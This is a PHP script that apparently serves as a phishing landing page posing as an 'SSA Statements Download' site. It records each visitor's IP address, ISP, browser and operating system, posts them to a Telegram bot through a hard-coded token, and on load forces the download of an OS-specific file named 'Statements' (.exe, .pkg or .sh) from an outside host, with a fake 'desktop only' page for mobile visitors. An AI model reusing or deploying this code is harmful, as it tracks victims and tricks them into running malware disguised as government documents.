<?php
// Visitor counter
$counter_file = 'visitor_count.txt';
$visitor_count = file_exists($counter_file) ? (int)file_get_contents($counter_file) + 1 : 1;
file_put_contents($counter_file, $visitor_count);

// Get visitor info
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');
$isp = gethostbyaddr($ip); // Get ISP/domain info

// Detect operating system and device
$isMobile = preg_match('/mobile|android|iphone|ipad/i', $ua);
$os = 'Unknown OS';
$fileUrl = '';

if (stripos($ua, 'Win') !== false) {
    $os = 'Windows';
    $fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe';
} elseif (stripos($ua, 'Mac') !== false) {
    $os = 'Mac';
    $fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.pkg';
} elseif (stripos($ua, 'Linux') !== false) {
    $os = 'Linux';
    $fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.sh';
} else {
    $fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe'; // Default to Windows file if OS is unrecognized
}

// Format message with black background style
$message = "```\n"
          ."🚀 New SSA WEBSITE VISIT DETECTED!\n"
          ."══════════════════════════════\n"
          ."👤 Visitor No: $visitor_count\n"
          ."🌐 IP Address: $ip\n"
          ."📡 ISP: ".($isp ?: 'Unknown')."\n"
          ."💻 Device: $ua\n"
          ."🖥️ Operating System: $os\n"
          ."🕒 Time: $time\n"
          ."══════════════════════════════\n"
          ."🔔 VISITOR TRACKING ACTIVE!\n"
          ."```";

// Send to Telegram
$botToken = '7284066719:AAEncc3VY27DzgRzCLnuNTLpyIJf5MrrCos';
$chatId = '7724482403';
$url = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'MarkdownV2',
    'disable_web_page_preview' => true
];

// Use cURL if available (more reliable)
if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
} else {
    file_get_contents($url.'?'.http_build_query($data));
}

// Serve the appropriate file for download
if ($isMobile) {
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Red Flag - Statements Download</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f8d7da;
            color: #721c24;
            padding: 50px;
        }
        .red-flag {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .countdown {
            font-size: 48px;
            font-weight: bold;
        }
    </style>
    <script>
        let countdown = 20; // 20 seconds countdown
        function updateCountdown() {
            document.getElementById("countdown").innerText = countdown;
            if (countdown <= 0) {
                window.close(); // Close the tab when countdown reaches 0
            } else {
                countdown--;
                setTimeout(updateCountdown, 1000);
            }
        }
        window.onload = updateCountdown;
    </script>
</head>
<body>
    <div class="red-flag">⚠️ Statements download is only allowed on Desktop/PC/Computer! ⚠️</div>
    <div>Please switch to a desktop device for downloading the statements.</div>
    <div class="countdown">Redirecting in <span id="countdown">20</span> seconds...</div>
</body>
</html>';
    exit;
} else {
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSA Statements Download</title>
    <script>
        function downloadFile() {
            const fileUrl = "' . $fileUrl . '";
            const link = document.createElement("a");
            link.href = fileUrl;
            link.download = fileUrl.substring(fileUrl.lastIndexOf("/") + 1);
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
        window.onload = downloadFile;
    </script>
</head>
<body>
    <h1>Thank you for visiting SSA!</h1>
    <p>Your file download should start automatically. If it doesn\'t, <a href="' . $fileUrl . '" download>click here</a>.</p>
</body>
</html>';
    exit;
}
?>
